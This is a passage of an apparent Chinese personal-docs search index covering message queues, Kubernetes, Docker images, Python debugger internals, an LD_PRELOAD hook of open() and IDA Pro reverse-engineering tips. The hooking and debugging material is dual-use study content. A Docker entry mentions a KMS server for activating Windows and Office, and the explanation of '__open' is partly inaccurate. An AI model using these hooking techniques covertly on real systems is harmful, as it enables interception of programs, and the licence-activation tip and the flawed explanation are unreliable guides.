结合erlang语言本身的并发优势，性能较好，社区活跃度也比较高，但是不利于做二次开发和维护。 不过，RabbitMQ的社区十分活跃，可以解决开发过程中遇到的bug。 如果你的数据量没有那么大，小公司优先选择功能比较完备的RabbitMQ。 参考 秒懂消息队列MQ，万字总结带你全面了解消息队列MQ 消息队列（MQ）到底能干什么？ 深入消息队列MQ，看这篇就够了！","tags":"中间件","url":"/yq-doc-source-docs-Chaotic-middleware-Mq-index.html","loc":"/yq-doc-source-docs-Chaotic-middleware-Mq-index.html"},{"title":"中间件","text":"为什么要使用 异步 同步的事件驱动转为异步的消息驱动 解藕 不同技术、不同语言之间系统对接 削峰 用稳定的系统资源处理突发的流量冲击","tags":"中间件","url":"/yq-doc-source-docs-Chaotic-middleware-index.html","loc":"/yq-doc-source-docs-Chaotic-middleware-index.html"},{"title":"消息队列","text":"rabbitmq地址: AMQP 0-9-1 Protocol 此文主要介绍 AMQP (Advanced Message Queuing Protocol) 协议: 高级消息队列协议 设计目标: 让服务端可通过协议编程 组成: 网络协议 服务端服务 包含: 高级消息队列协议模型(AMQ Model) 网络层协议AMQP, 让客户端程序与实现了AMQ Model的服务端进行通信 AMQP协议是一个二进制协议，具有一些现代特性: 多通道（multi-channel） 可协商（negotiated） 异步 安全 便携 语言中立 高效 基本的AMQP模型: | Exchange Queue | 发布者 -> | 交换机 -> Msg Queue | -> 消费者 Publisher | | Consumer | AMQP Model | 消息由交换机路由给消息队列 没来得及看的一些文章:: 一篇文章讲透彻了AMQP协议 AMQP 协议详解 RabbitMQ MQTT协议和AMQP协议 AMQP 入门","tags":"中间件","url":"/yq-doc-source-docs-Chaotic-middleware-message-queue.html","loc":"/yq-doc-source-docs-Chaotic-middleware-message-queue.html"},{"title":"Kubernetes","text":"官网主页: Kubernetes 文档 k8s集群演变: 单体应用 --> 前后端分离 --> 微服务 --> 容器（貌似单体应用就有了） --> k8s容器集群 k8s大体架构: ingress （流量进入） ingress pod (一般是nginx分发) front-end service (前端) backend service （后端） pod1 pod2 pod5 纯容器集群的问题 业务容器数量庞大，哪些容器部署在哪些节点，使用了哪些端口，如何记录、管理 跨主机通信，多个机器中的容器之间相互调用如何做，iptables规则手动维护？ 跨主机容器间互相调用，配置如何写？写死固定IP+端口？ 如何实现业务高可用？多个容器对外提供服务如何实现负载均衡？ 容器的业务中断了，如何可以感知到，感知到以后，如何自动启动新的容器？ 如何实现滚动升级保证业务的连续性？ 集群管理 因为 纯容器集群的问题 , 所以有了集群管理工具 Docker Swarm Mesos Google Kubernetes 2017年开始 Kubernetes 凭借强大的容器集群管理功能，逐步占据市场，目前在容器编排领域一枝独秀 k8s 架构 分布式系统，两类角色 管理节点master 工作节点worker(或者slave) 架构图 k8s 核心组件 主要是针对管理结点 ApiServer APJ服务器，集群资源访问控制入口，提供reStAPJ及安全访问控制 ETCD 分布式高性能键值数据库，存储整个集群的所有元数据 Scheduler 调度器，负责把业务容器调度到最合适的Node节点 Controller Manager 控制器管理，确保集群资源按照期望的方式运行 Replication Controller Node controller ResourceQuota Controller Namespace Controller ServiceAccount Controller Token Controller Service Controller Endpoints Controller kubelet 运行在每个节点上的主要的\"节点代理\"，脏活累活(Docker主要是在这) pod 管理 kubelet 定期从所监听的数据源获取节点上pod/container 的 期望状态（运行什么容器、运行的副本数量、网络或者存储如何配置等等）， 并调用对应的容器平台接口达到这个状态。 容器健康检查 kubelet 创建了容器之后还要查看容器是否正常运行， 如果容器运行出错，就要根据 pod 设置的重启策略进行处理. 容器监控 kubelet 会监控所在节点的资源使用情况，并定时向 master 报告， 资源使用数据都是通过 GAdvisor 获取的。 知道整个集群所有节点的资源情况，对于 pod 的调度和正常运行至关重要 kube-proxy 维护节点中的iptables或者ipvs规则 Kubectl 命令行接口，用于对 Kubernetes 集群运行命令 https://kubernetes.io/zh/docs/reference/kubect!/ 工作流程","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-K8S-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-K8S-index.html"},{"title":"好用的docker仓库","text":"⭐️ webmin , 控制面板 ⭐️ jellyfin , 媒体服务器 aliyun-webdav, 阿里云盘webdva ⭐️ ariang：下载机 emqx ：Mqtt服务中心，工作环境偶尔用 kms：服务器 激活自己和朋友的windows+office nastools ：管理界面（不好用，废弃掉） onthing ：网心云，带宽赚钱（废弃掉，不缺这每天2块钱） ⭐️ photoprism ：照片管理工具，可以上传照片，但没必要 ftp ：开启ftp服务器（不常用） nginx ：部署项目，代理一些本地文件 ⭐️ autoBangumi ：自动追番 arsenal（武器库）： 提供一个webhook，调用即可发送邮件，用自己的域名发送，接入阿里云DDNS功能 webmin 控制面板, 拉取: docker pull johanp/webmin 默认配置: Username: root Password: password hubdocker地址: johanp/webmin 还有samba管理, bind ( /docs/杂乱无章/计算机网络/config_dns/docker-bind部署dns-管理面板 ) 等相关的 jellyfin 媒体服务器 拉取: docker pull linuxserver/jellyfin 地址: linuxserver/jellyfin","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-The-easy-to-use-Docker-warehouse.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-The-easy-to-use-Docker-warehouse.html"},{"title":"docker仓库","text":"","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker-warehouse.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker-warehouse.html"},{"title":"仓库搜集","text":"","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_store-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_store-index.html"},{"title":"docker","text":"","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-index.html"},{"title":"nginx","text":"","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-nginx-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-index.html"},{"title":"常见漏洞","text":"","tags":"安全","url":"/yq-doc-source-docs-Safety-Common-loopholes-index.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-index.html"},{"title":"Python灰帽子","text":"前言: 此文源于书籍 Python灰帽子 , 不过这本书有点老了, 是基于 Python2.5 的, 我阅读的时候尽量转换为 Python3 来记录. 安装相关 Python安装部分跳过. 很简单 2024推荐工具: Pycharm (原文是Eclipse, 很强但有点过时了) 最重要的库 Ctypes , 可参考: /docs/后端/python/python标准库/ctypes Ctypes使用动态库 使用 ctypes 的第一步就是明白如何解析和访问动态链接库中的函数。一个 dynamically linked library（被动态连接的库）其实就是一个二进制文件，不过一般自己不运行，而是由别 的程序调用执行。 在 Windows 上叫做 dynamic link libraries （DLL）动态链接库 ， 在 Linux上叫做 shared objects（SO）共享库 。无 论什么平台，这些库中的函数都必须通过导出的名字调用， 之后再在内存中找出真正的地址。所以正常情况下，要调用函数，都必须先解析出函数地址， 不过 ctypes 替我们完成了这一步。 ctypes 提供了三种方法调用动态链接库： cdll0 windllO oledll0 它们的不同之处就在于，函数的调用方法和返回值。 cdllO加载的库，其导出的函数必须使用标准的 cdedl调用约定。 windI0方法加载的库，其导出的函数必须使用 stdcall调用约定（Win32API 的原生约定） oledl0方法和windIlO类似，不过如果函数返回一个 HRESULT错误代码，可以使用COM函数得到具体的错误信息。 调用约定 调用约定专指函数的调用方法。 其中包括，函数参数的传递方法，顺序（压入栈或者传给寄存器）， 以及函数返回时，栈的平衡处理。 下面这两种约定是我们最常用到的： cdecl : cdecl 调用约定，函数的参数从右往左依次压入栈内， 函数的调用者，在函数执行完成后，负责函数的平衡。这种约定常用于x86 架构的C语言里。 stdcall cdecl 例子: InC : int python_rocks（reason_one, reason_two, reason_three）； In x86 Assembly : push reason_three push reason_two push reason_one call python_rocks add esp, 12 从上面的汇编代码中，可以清晰的看出参数的传递顺序，最后一行，栈指针增加了 12 个字节（三个参数传递个函数，每个被压入栈的指针都占 4 个字节，共12个）， 使得函数调用之后的栈指针恢复到调用前的位置。 下面是个 stdcall 调用 约定的了例子，用于 Win32 API。 InC : int my_socks（color_one color_two, color_three）； In x86 Assembly : push color_three push color_two push color_one call my_socks 这个例子里，参数传递的顺序也是从右到左， 不过栈的平衡处理由函数 my_socks自己完成，而不是调用者(没有 esp(栈顶指针) 调整指针)。 最后一点， 这两种调用方式的返回值都存储在 EAX 中 。 构造C数据类型 见 /docs/后端/python/python标准库/ctypes 调试器构造 白盒调试 正常源码开发时, 利用编辑器比如Pycharm自带的调试器进行调试 黑盒调试 不知道源码, 只知道反编译之后的汇编, 利用汇编调试工具进行调试 一般分为 用户模式: 以用户的身份; 相关工具: WinDbg(微软生产), OllyDbg(免费程序), gdb; PyDbg; Immunity Debugger(界面友好, 类似OllyDbg) 内核模式: 与底层交互 X86八个通用寄存器(具体说明可参考: /docs/安全/逆向工程/汇编 ): EAX, EDX, ECX, ESI, EDI, EBP, ESP 和 EBX 寄存器说明 EAX 寄存器(Extended Accumulator, 扩展累加器) 也叫做 累加寄存器 ，除了用于存储函数的返回值外也用于执行计算的操作。 许多优化的 x86指令集都专门设计了针对 EAX 寄存器的读写和计算指令。 列如从最基本的加减，比较到特殊的乘除操作都有专门的EAX优化指令。 前面我们说了，函数的返回值也是存储在EAX寄存器里。 这一点很重要，因为通过返回的EAX 里的值我们可以判断函数是执行成功与否，或者得到确切返回值。 EDX 寄存器 (Extended Data, 扩展数据) 也叫做数据寄存器。这个寄存器从本质上来说是EAX 寄存器的延伸， 它辅助 EAX完成更多复杂的计算操作像乘法和除法。 它虽然也能当作通用寄存器使用，不过更多的是结合EAX 寄存器进行计算操作。 ECX寄存器(Extended Counter, 扩展计数器) 也叫做计数寄存器，用于循环操作，比如重复的字符存储操作，或者数字统计。 有一点很重要，ECX寄存器的计算是向下而不是向上的（简单理解就是用于循环操作时是由大减到小的）。 如一下Python片段: counter = 0 while counter < 10: print(counter) counter += 1 如果你把这代码转化成汇编代码，你会看到第一轮的时候ECX 将等于 10， 第二轮的时候等于9，如此反复知道ECX 减少到0。 这很容易让人困惑，因这和 Python 的循环刚好代码相反，但是只要记得ECX 是向下计算的就行了。 在x86汇编里，依靠 ESI 和 EDI 寄存器能对需要循环操作的数据进行高效的处理。 ESI 寄存器(Extended Source Index, 扩展源索引) 是源操作数指针，存储着输入的数据流的位置。 ESI （source index）用于读 EDI 寄存器(Extended Destination Index, 扩展目标索引) 是目的操作数指针，存储了计算结果存储的位置。 EDI （destination index）用于写。 用源操作数指针和目的操作数指针，极大的提高了程序处理数据的效率。 ESP(Extended Stack Pointer, 扩展堆栈指针) 和 EBP(Extended Base Pointer, 扩展基址指针) 分别是栈指针和基指针. 这两个寄存器共同负责函数的调用和栈的操作。 当一个函数被调用的时候，函数需要的参数被陆续压进栈内最后函数的返回地址也被压进。 ESP指着栈顶，也就是返回地址。 EBP 则指着栈的底端。有时候，编译器能够做出优化，释放EBP，使其不再用于栈的操作，只作为普通的寄存器使用。 EBX(Extended Base, 扩展基址) 唯一一个没有特用途的寄存器。它能够作额外的数据储存器。 EIP(Extended Instruction Pointer, 扩展指令指针) 总是指向马上要执行的指令。 当CPU执行一个程序的成千上万的代码的时候，EIP 会实时的指向当前CPU马上要执行到的位置。 一个调试器必须能够很方便的获取和修改这些寄存器的内容。 每一个操作系统都提供了一个接口让调试器和 CPU 交互，以便能够获取和修改这些值。 注解 a(Accumulator), 8位累加器。8080。b 基址，c 计数，d数据 ax(Accumulator)，16位累加器，由ah，al 组成。8086。bx=bh+bl,cx=ch+cl,dx=dh+dl eax(Extended Accumulator)，32位累加器，80386 rax(Return Accumulator)，64位累加器。X86-64 关于X的解释: 最早的x86的累加寄存器叫ax, 高位為ah, 低位為al, 拼在一起叫ax. IA-32時代以后叫eax, 擴展(extend)為32位, 這個e就是extend, a是accumulate, x其實是h加l的意思, 沒特別意義 参考: http://bbs.chinaunix.net/thread-2315852-1-1.html 栈 机器执行计算是通过栈进行操作的, ESP 总是指向栈顶, EBP 指向栈基址 栈从内存高地址向低地址增长 断点 软件断点: INT3 中断 硬件断点: INT1 中断 内存断点: 利用保护页(可读, 可写, 可执行页) 实现一个Windows调试器 进程启动方式(两种) 由调试器启动进程 调试器附加到进程 相关Win32API: 启动进程: BOOL WINAPI Create ProcessA( LPCSTR IpApplicationName, LPTSTR IpCommandLine, LPSECURITY_ATTRIBUTES IpProcessAttributes, LPSECURITY_ATTRIBUTES IpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID IpEnvironment, LPCTSTR IpCurrentDirectory, LPSTARTUPINFO IpStartupInfo, LPPROCESS_INFORMATION IpProcessInformation ) 附加到进程前的打开进程句柄: HANDLE WINAPI OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle DWORD dwProcessId ) 附加到进程: BOOL WINAPI DebugActiveProcess( DWORD dwProcessId )","tags":"安全","url":"/yq-doc-source-docs-Safety-Python-gray-hat.html","loc":"/yq-doc-source-docs-Safety-Python-gray-hat.html"},{"title":"实战-Ubuntu16下Hook系统的open","text":"因为上一篇的 /docs/安全/逆向工程/实战-Mac下Hook其他进程 失败了, 然后找原因啊, 巴拉巴拉的, 就有了这个 Hook标准库的open 注解 此篇幅本也是想用add的, 但是估计是动态库的使用方式不对, 所以最终还是换成了系统的动态库里面的open调用 下方源码主要看open, add后面再看啥问题 test3.c源码: #include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <sys/types.h> #include <sys/stat.h> int add(int a, int b){ return a+b+3; } int main(){ int a = 200; int b = 300; int ret = add(a, b); printf(\"a + b = %d + %d = %d\\n\", a, b, ret); int fd = open(\"test3.c\", O_RDONLY) ; if (fd != -1){ printf(\"open t3 success\\n\"); } else { printf(\"open t3 failed\\n\"); } close(fd); return 0; } 编译为执行文件: gcc -g -o test3 test3.c 然后是hook的代码hookt3.c: #include \"stdio.h\" int add(int a, int b){ printf(\"===hook in====\"); int ret = a + b + 100; printf(\"===hook out===\"); return ret; } extern int __open(char *,int,int); //打开文件 int open(char * path,int flags,int mode) { //输出打开的文件名 printf(\"=======hook open :%s\\n\",path); int ret = __open(path,flags,mode); printf(\"===hoot fd: %d \\n\", ret); return ret; // return 0; } 编译为动态库: gcc -shared -fPIC -g -o libhkt2.so hookt3.c 单独执行: $ ./test3 a + b = 200 + 300 = 503 open t3 success 加hook库: $ LD_PRELOAD=./libhkt2.so ./test3 a + b = 200 + 300 = 503 =======hook open :test3.c ===hoot fd: 3 open t3 success ldd对比下加载库顺序: root@740ff0ad5041:~/project/test# ldd test3 linux-vdso.so.1 => (0x00007fff657c8000) libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5d2fd2a000) /lib64/ld-linux-x86-64.so.2 (0x00007f5d300f4000) 做了 LD_PRELOAD 的: root@740ff0ad5041:~/project/test# LD_PRELOAD=./libhkt2.so ldd test3 =======hook open :/dev/tty ===hoot fd: 3 =======hook open :/usr/bin/ldd ===hoot fd: 3 linux-vdso.so.1 => (0x00007ffebd48a000) ./libhkt2.so (0x00007f9b745a3000) libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9b741d9000) /lib64/ld-linux-x86-64.so.2 (0x00007f9b747a5000) root@740ff0ad5041:~/project/test# 为什么open要使用双下划线前缀 使用__open对底层open函数进行hook,为什么定义的函数原型是: extern int __open(char *,int,int); 原因是: 在GNU/Linux系统中,系统调用和库函数的名称带有前缀来区分。 对应open系统调用的库函数名称是__open。 如果直接使用系统调用的 API,如 open()、write() 等,定义和调用时使用的是没有下划线前缀的名称,如 open()。 但是如果要对系统调用做 hook,那么 hook 函数的定义需要使用下划线前缀隐藏名称,如 __open()。 标准库函数如 strcpy()、printf() 等,直接使用和定义时也是没有下划线前缀。 只有在需要进行 hook 标准库函数时,hook 函数才使用下划线前缀隐藏名称,如 __strcpy() 等。 Hook标准库的自定义的add 经过不懈努力, 终于在linux上成功了, 之前编译顺序问题导致一直失败 ub16正确编译带库的执行文件: gcc -o test3 test3.c -luadd -L./ -g 换个顺序就是错的: // error, 找不到add gcc -luadd -L./ -g -o test3 test3.c 自定义一个动态库, 实现add函数 add.h: int add(int a, int b); add.c: #include \"add.h\" int add(int a, int b){ return a+b+300; } 将add编译为uadd库: gcc -shared -fPIC -g -o libuadd.so add.c 入口执行文件test3.c: #include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <sys/types.h> #include <sys/stat.h> #include \"add.h\" int main(){ int a = 200; int b = 300; int ret = add(a, b); printf(\"a + b = %d + %d = %d\\n\", a, b, ret); int fd = open(\"test3.c\", O_RDONLY) ; if (fd != -1){ printf(\"open t3 success\\n\"); } else { printf(\"open t3 failed\\n\"); } close(fd); return 0; } // linux下 -o test3 test3.c 得在最前面, 不然找不到add // gcc -o test3 test3.c -luadd -L./ -g // gcc -g -o test3 test3.c 编译为执行文件: gcc -o test3 test3.c -luadd -L./ -g hook的库源码hookt3.c: #include <stdio.h> int add(int a, int b){ printf(\"===hook in add====\\n\"); int ret = a + b + 100; printf(\"===hook out add===\\n\"); return ret; } extern int __open(char *,int,int); //打开文件 int open(char * path,int flags,int mode) { //输出打开的文件名 printf(\"=======hook open :%s\\n\",path); int ret = __open(path,flags,mode); printf(\"===hoot fd: %d \\n\", ret); return ret; // return 0; } // gcc -shared -fPIC -g -o libhkt2.so hookt3.c // LD_LIBRARY_PATH=./ LD_PRELOAD=./libhkt2.so ./test3 编译为动态库hkt2: gcc -shared -fPIC -g -o libhkt2.so hookt3.c 现在可以来测试了, 当不插入hook动态库时候: $ LD_LIBRARY_PATH=./ ./test3 a + b = 200 + 300 = 800 open t3 success 注解 此处使用 LD_LIBRARY_PATH 是因为, 调用了当前自己编的动态库, 这样才能找到 不这样的话, 要么写到系统库路径去, 要么重写下ldconf 当插入hook时: $ LD_LIBRARY_PATH=./ LD_PRELOAD=./libhkt2.so ./test3 ===hook in add==== ===hook out add=== a + b = 200 + 300 = 600 =======hook open :test3.c ===hoot fd: 3 open t3 success 重要 LD_PRELOAD 只是预加载动态库的, 如果add直接是源码写在了执行文件, 或者add在静态库, 那么这种方法就不行了","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-Actual-combat-Open-of-the-HOOK-system-under-the-HOOK-system-under16.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-Actual-combat-Open-of-the-HOOK-system-under-the-HOOK-system-under16.html"},{"title":"IDA工具","text":"IDA是一款强大的反编译工具, 支持跨平台 官网: https://hex-rays.com/ida-free/#download IDA全称是交互式反汇编器专业版（Interactive Disassembler Professional），人们其简称为IDA， 是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器！ IDA Pro是一款交互式的，可编程的，可扩展的，多处理器的，交叉Windows或Linux WinCE MacOS平台主机来分析程序， 被公认为最好的花钱可以买到的逆向工程利器。IDA Pro已经成为事实上的分析敌意代码的标准并让其自身迅速成为攻击研究领域的重要工具。 它支持数十种CPU指令集其中包括Intel x86，x64，MIPS，PowerPC，ARM，Z80，68000，c8051等等。 IDA（Interactive Disassembler）是一款强大的逆向工程工具， 用于分析和逆向编译二进制文件（如可执行文件、动态链接库等）。 它提供了广泛的功能和特性，使逆向工程师能够深入研究和理解二进制文件的结构、逻辑和功能。 以下是一些IDA的主要特点和功能： 反汇编和分析：IDA能够将二进制文件反汇编为可读的汇编代码， 使用户能够查看和理解程序的底层指令和操作。 它可以对程序进行静态分析，提取函数、变量、控制流图等信息，并提供高级的图形化界面来展示分析结果。 交互式调试：IDA具有内置的调试功能，可以与调试器集成， 允许用户在逆向分析过程中跟踪和调试二进制文件。 它支持断点设置、单步执行、寄存器和内存查看等调试操作，帮助用户理解程序的执行过程和状态。 可扩展性：IDA支持插件和脚本，使用户能够根据自己的需求定制和扩展工具的功能。 用户可以编写脚本来自动化分析任务、执行自定义的分析算法或添加新的功能模块。 支持多种平台和文件格式：IDA可以处理多种不同的二进制文件格式和处理器架构， 包括x86、ARM、MIPS等。它还支持多个操作系统，包括Windows、Linux、macOS等。 IDA在逆向工程、恶意代码分析、漏洞研究等领域被广泛使用。 它为逆向工程师提供了强大的工具和功能，以帮助他们深入研究和分析二进制文件， 理解程序的内部工作原理，并发现其中的潜在问题和漏洞。 入门教程: https://blog.csdn.net/qq_47403671/article/details/119939585 布局 左侧窗口为函数列表窗口 右侧窗口为IDA反汇编所得的汇编代码 最下侧窗口为文件在反汇编过程中的信息。 菜单 File：用于打开、新建、装载、保存、关闭一个文件或是数据库 Edit：用于编辑反汇编代码 Jump：用于跳转到某个位置、地址或是一个窗口 Search：用于搜索代码段、数据、错误等等 View：用于显示文件内容的显示方式 Debugger：调试器，集成在IDA中 Lumina：对元数据进行各种操作 Options：可以进行一些个性化的设置 快捷键 Ctrl+Enter 前进 Esc 后退 space(空格) 切换视图格式或者代码格式 A 显示硬编码-以字符串显示 C 显示硬编码-以code形式显示 D 显示硬编码-以数据形式显示, 按一次表示1个字节, 2次表示两个字节(dw), 3次表示4字节 U 显示硬编码-undefined (以原始字节显示) G 跳转到给定的地址 ALT + T 搜索 CTRL + T 再次搜索 N 更改变量的名称 P 创建函数 ALT + Q 修改为指定的结构体类型 (全局变量) T 修改为指定的结构体类型 (局部变量) ; (分号) 写注释 (注释会在调用/引用位置同步显示) : (冒号) + shift + ; (分号) 写注释 (注释只会在写的位置显示) X 查看引用, 对着某个函数、变量按该快捷键，可以查看它的交叉引用 y 更改变量的类型 F2 在所在行下断点 F5 快速反汇编，将文件汇编语言转换成伪代码，便于使用者对其进行分析。 可以将ARM指令转化为可读的C代码，同时可以使用Y键，对JNIEnv指针做一个类型转换，从而对JNI里经常使用的JNIEnv方法能够识别 比如快速转换为C 尽量不用, 因为不会很准确, 识别不了的地方会省略, 且没有直接看汇编代码清晰 F7 单步步进, 单步进入调试 F8 单步步过, 按照顺序一行一行，单步调试 F9 继续运行程序, 直接跳到下一个断点处 F4 运行到光标所在行 Ctrl + F7 直到该函数返回时才停止 Ctrl + F2 终止一个正在运行的进程 Shift + F12 查看String, 快速查看so文件中的字符串信息，分析过程中通过一些关键字符串能够迅速定位到关键函数 Ctrl + s 有两个用途， 在IDA View页面中可以查看文件so文件的所有段信息 在调试页面可以查看程序中所有so文件映射到内存的基地址 注解 tips: 在进行so调试过程中，很有用的一个小技巧就是IDA双开， 一个用于进行静态分析；一个用于动态调试。比如说调试过程中要找到一个函数的加载到内存中的位置， IDA部分前缀含义 sub_ 指令和子函数起点 locret_ 返回指令 loc_ 指令 off_ 数据，包含偏移量 seg_ 数据，包含段地址值 asc_ 数据，ASCII字符串 byte_ 数据，字节（或字节数组） word_ 数据，16位数据（或字数组） dword_ 数据，32位数据（或双字数组） qword_ 数据，64位数据（或4字数组） flt_ 浮点数据，32位（或浮点数组） dbl_ 浮点数，64位（或双精度数组） tbyte_ 浮点数，80位（或扩展精度浮点数） stru_ 结构体(或结构体数组) algn_ 对齐指示 unk_ 未处理字节 程序基址(Rebase Program) 注解 有的地方说法是: 目标函数实际地址=函数偏移+so基址+1， +1是因为要标识arm和thumb指令区别； 计算: 偏移后模块基地址 = 偏移前模块基地址 + ASLR偏移 每次下断点的时候，都是通过先手工在IDA里查看的偏移前模块基地址，再手工在LLDB里查看ASLR偏移，最后手工在计算器里将两者相加的方式来计算偏移后模块基地址的，虽然结果可以保证100%正确，但操作流程稍有些复杂 如何才能只手工操作一次，就可以搞定所有断点的地址。那就是让IDA直接显示计算好的偏移后模块基地址? 首先在LLDB里查看待分析模块的ASLR偏移: (lldb) image list -o -f [ 0] 0x00000000000a0000 /var/containers/Bundle/Application/046BD91B-E9FB-4C77-8EC3-908237232716/TargetApp.app/TargetApp(0x00000001000a0000) ... 这里ASLR偏移是 0x00000000000a0000 。 然后打开IDA设置rebase program: 首先将鼠标光标点击到IDA右边的界面，这样才会有我们需要设置的选项。 在菜单上的\"Edit\"、\"Segments\"、\"Rebase program...\"里将\"Value\"的值加上TargetApp的ASLR偏移， 可以看到起始的地址是0x100000000, 加上ASLR偏移地址: 参考: IDA调试技巧（妥妥的干货分享） IDA设置条件记录断点 参考: ida设置条件记录断点 更详细的: IDA断点和搜索 设置内存断点 内存断点属于硬件断点, 而上面的条件记录的代码断点式软件断点 内存断点需要提前配置数据块信息 流程: 在代码区，g到找到的数据块地址。 在数据块首地址按下F2,设置断点。 因为这个断点所在位置不是代码块，IDA会弹出设置对话框。可以在里面填数据块长度。 非必须，去看看断点列表，看看内存断点和执行断电的区别。 内存访问断点和执行断点的区别 可以看到： 执行断点是软件断点。 内存访问断点是硬件断点。 参考: IDA动态调试---设置内存断点（半转载） 远程调试 ida支持远程调试Windows、linux、Android、Mac OS的二进制文件， 将文件放在远程的对应系统服务器上，ida远程连接服务器，在服务器上运行、调试程序， 并在本地客户端显示调试界面。界面视图上和本地调试并没有区别。 如果需要远程调试，首先需要将ida的服务端部署在远程服务器上，ida的服务端存储在ida目录中的dbgsrv文件中 将需要调试的文件和服务端版本放入服务器中，然后运行服务端，会默认在23946端口启动ida服务端程序，以linux为例 被调试程序是64位elf文件，所以在linux端运行linux_server64，然后回到客户端 客户端的第一步没什么变化，在菜单选择debugger栏，在选择debugger时，选择Remote Linux debugger 参考: ida使用技巧之动态调试 虚拟内存空间地址表 高2G空间 （Ring0级能访问区域） 0xFFFFFFFF-0xC0000000：1GB用于VxD、存储器管理和文件系统； 0xBFFFFFFF-0x80000000：1GB共享的WIN32 DLL、存储器映射文件和共享存储区； 低2G空间（Ring3权限区域）: 0x7FFFFFFF-0x00400000：约2GB为每个进程的WIN32专用地址； 0x003FFFFF-0x00001000：为MS-DOS系统 和 WIN16应用程序； 0x00000FFF-0x00000000：为防止使用空指针的4,096字节； 同时顺便提醒一下，不管EXE或DLL基址都是可变的，但一个DLL加载到EXE后，基址会被重定向，但偏移地址是不变的； 于PE文件，PE头的长度并不是固定的，当然有着同样的解析标准，可也导致IDA中偏移地址-基址不一定等于文件地址， 判断代码在文件中的基址很容易，通常PE头在WinHex中可以清晰的看到\"This program cannot be run in DOS.....\"， 之后就是一些段名称：如.text，.rdata。接着就是一小段00，之后出现数据的地方就是代码基址，大部分是55 8B或56 8B等。 参考(还有获取偏移地址说明): 逆向中静态分析工具——IDA初学者笔记 待看 参考这使用： IDA pro与x64dbg地址对齐 IDC脚本/指令 就是界面左下角的那个 DC是ida中支持的一门与C语言类似的语言，但是它是解释型的， 并不是编译型的，于此同时IDC还融合了一些python中的元素以方便一些内容的处理。 执行IDC脚本一共有三种方式: idc命令行（菜单栏file->idc command） 脚本文件 (菜单栏file->script file) python命令行（菜单栏file->python command） 注释 idc中使用C++风格的 // 进行单行注释； 采用c风格的 /* */ 进行多行注释。 帮助系统 ida为用户提供了一个很完备的帮助系统，可以使用F1快捷键打开帮助系统， 其中点击\"index of idc functions\"可以看到对应一些idc的函数列表。 idc变量 idc在一个语句中可以生命多个变量，但是idc不支持c语言风格的数组、指针、结构体、联合等复杂的数据结构。 idc是一种松散的语言，变量没有明确的类型，其主要使用三种数据类型：整形（long）、字符串型、浮点值。 支持全局变量和局部变量 局部变量(auto): auto add,reg,val; //多个变量同时声明，未初始化 auto valinit=0; //声明同时初始化 全局变量(extern): extern outval; extern illeval=\"wrong\" //非法定义，声明全局变量时不能进行初始化 static main(){ extern insideval; outval=\"global string\" //为全局变量赋值 insideval=1; } idc函数 idc中也可以自定义函数，其声明方式为: static func(arg1,arg2,arg3) { statements ... } 用户定义函数不需要进行指定特定的参数类型，因为在需要的时候程序会自动进行转化。 如果需要函数返回指定的值需要使用return进行指定，否则默认不显示返回一个值的函数都将返回零值。 idc语句 idc中支持C中的语句，除了switch。 idc表达式 idc几乎都能支持C语言中的操作运算表达（加减乘除、判等家族），但是明确说明不支持+=。 idc预定义符号 idc有一些符号是提前定义好了的，其内容和含义如下: _NT_ IDA is running under MS Windows _LINUX_ IDA is running under Linux _MAC_ IDA is running under Mac OS X _UNIX_ IDA is running under Unix (linux or mac) _EA64_ 64-bit version IDA _QT_ GUI version of IDA (Qt) _GUI GUI version of IDA _TXT_ Text version of IDA _IDA_VERSION_ The current IDA version. For example: \"7.5\" _IDAVER_ The current, numerical IDA version. For example: \"750\" means v7.5 idc字符串操作（切片） idc中对于字符串的操作应该是借鉴了python，其string类型的操作支持切片操作（slices） idc异常处理 idc异常处理中，可以使用的表达语句: auto e; try { ... some statements that cause a runtime error... } catch ( e ) { // e holds the exception information // it is an instance of the exception class } throw xx; #抛出 idc程序 如果只是需要进行简单的查询或者查看，可以直接编写个别行的函数完成编写， 但是如果一个脚本应用需要执行大量的IDC程序，并且还可能会在很多场景下需要重复使用， 那么我们可能需要创建一个独立的IDC程序文件。 IDC程序文件要求用户使用用户定义的函数，并且至少定义一个没有参数的main函数， 此外主程序文件中必须包含idc.idc头文件: #idc程序文件基本结构 #Include <idc.idc> static main(){ Message(\"this is a IDC scipt file\"); } IDC支持如下C预处理指令: #include <文件> ；将指定的文件包含在当前文件中 #define <宏名称>[可选项] ；创建宏，可以选择给宏分配指定的值 #ifdef <名称>; 测试指定的宏是否存在 #else 与ifdef一起使用 #endif 通过ifdef指定定义终止符 #undef <名称> ；删除指定的宏 参考: ida-IDC脚本剖析 一文解决IDA的IDC脚本语言入门教程 https://ybrc.github.io/zh-cn/14-2/ 3.1 IDA Pro编写IDC脚本入门 IDA 中的IDC脚本编写笔记 调试实操 使用IDA进行动态调试与过反调试","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA.html"},{"title":"IDA-Pro","text":"官网: https://hex-rays.com/IDA-pro/ 这个分免费版付费版, 